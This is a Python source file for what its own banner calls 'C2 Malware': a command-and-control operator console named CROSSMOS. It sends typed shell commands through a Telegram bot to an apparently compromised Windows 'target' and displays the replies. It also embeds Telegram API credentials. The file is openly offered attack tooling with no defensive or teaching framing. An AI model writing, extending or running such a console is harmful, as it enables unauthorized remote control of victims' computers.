from telethon import TelegramClient, events
import asyncio
import os
import sys

# ===== Terminal Clear (startup) =====
def clear_terminal():
    os.system("cls" if os.name == "nt" else "clear")
    banner()


# ===== Colors (Meterpreter Style) =====
CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
BLUE = "\033[1;34m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ===== Telegram Config =====
api_id = 34095118
api_hash = "4924a735e8c1770ae22833bb3370da2f"
bot_username = "commandanas_bot"

client = TelegramClient("kali_session", api_id, api_hash)
response_future = None


# ===== Incoming Message Handler =====
@client.on(events.NewMessage(from_users=bot_username))
async def handler(event):
    global response_future
    if response_future and not response_future.done():
        response_future.set_result(event.text)


def show_image_banner():
    try:
        # check if chafa exists
        result = os.system("chafa --version > /dev/null 2>&1")
        if result == 0 and os.path.exists("cross.png"):
            os.system("chafa cross.png --symbols block --colors full --size 80x40")
            print(f'''
            {YELLOW}		v1.0 By: Anas Labrini    C2 Malware{RESET}
            {YELLOW}    	https://anaslabrini.netlify.app{RESET}
            {YELLOW}    	https://github.com/anaslabrini        {RESET}                 
                                                                                   
    {RED}@@@@@@@  @@@@@@@    @@@@@@    @@@@@@    @@@@@@   @@@@@@@@@@    @@@@@@    @@@@@@   
   @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@   @@@@@@@@@@@  @@@@@@@@  @@@@@@@   
   !@@       @@!  @@@  @@!  @@@  !@@       !@@       @@! @@! @@!  @@!  @@@  !@@       
   !@!       !@!  @!@  !@!  @!@  !@!       !@!       !@! !@! !@!  !@!  @!@  !@!       
   !@!       @!@!!@!   @!@  !@!  !!@@!!    !!@@!!    @!! !!@ @!@  @!@  !@!  !!@@!!    
   !!!       !!@!@!    !@!  !!!   !!@!!!    !!@!!!   !@!   ! !@!  !@!  !!!   !!@!!!   
   :!!       !!: :!!   !!:  !!!       !:!       !:!  !!:     !!:  !!:  !!!       !:!  
   :!:       :!:  !:!  :!:  !:!      !:!       !:!   :!:     :!:  :!:  !:!      !:!   
    ::: :::  ::   :::  ::::: ::  :::: ::   :::: ::   :::     ::   ::::: ::  :::: ::   
    :: :: :   :   : :   : :  :   :: : :    :: : :     :      :     : :  :   :: : :    
                                                                                   

            ''')
            return True
    except:
        pass
    return False



# ===== Banner =====
def banner():
    print(f"""{RED}
	 ▄████▄   ██▀███   ▒█████    ██████   ██████  ███▄ ▄███▓ ▒█████    ██████ 
	▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██    ▒ ▓██▒▀█▀ ██▒▒██▒  ██▒▒██    ▒ 
	▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ░ ▓██▄   ▓██    ▓██░▒██░  ██▒░ ▓██▄   
	▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒  ▒   ██▒▒██    ▒██ ▒██   ██░  ▒   ██▒
	▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒▒██████▒▒▒██▒   ░██▒░ ████▓▒░▒██████▒▒
	░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
	  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░░ ░▒  ░ ░░  ░      ░  ░ ▒ ▒░ ░ ░▒  ░ ░
	░          ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░  ░  ░  ░      ░   ░ ░ ░ ▒  ░  ░  ░  
	░ ░         ░         ░ ░        ░        ░         ░       ░ ░        ░  
	░                                                                         
""")



# ===== Clear Terminal =====
image_displayed_once = False

def clear_terminal():
    global image_displayed_once
    os.system("cls" if os.name == "nt" else "clear")

    if not image_displayed_once and show_image_banner():
        image_displayed_once = True
    else:
        banner()




# ===== Main Loop =====
async def main():
    await client.start()
    clear_terminal()

    try:
        while True:
            cmd = input(f"{YELLOW}CROSSMOS@kali:{GREEN}~{RESET}$ ").strip()

            # ---- Exit Clean ----
            if cmd.lower() in ["exit", "quit"]:
                break

            # ---- Clear Command ----
            if cmd.lower() in ["clear", "cls"]:
                clear_terminal()
                continue

            if not cmd:
                continue

            global response_future
            response_future = asyncio.get_event_loop().create_future()

            await client.send_message(bot_username, cmd)

            try:
                response = await asyncio.wait_for(response_future, timeout=10)

                if "error" in response.lower() or "failed" in response.lower():
                    print(f"{RED}[!] ERROR{RESET}\n{response}\n")
                elif "warning" in response.lower():
                    print(f"{YELLOW}[!] WARNING{RESET}\n{response}\n")
                else:
                    print(f"{RED}[+] Windows Response{RESET}\n{response}\n")

            except asyncio.TimeoutError:
                print(f"{YELLOW}[!] No response received from target{RESET}\n")

    except KeyboardInterrupt:
        pass  # silent exit



with client:
    try:
        client.loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass


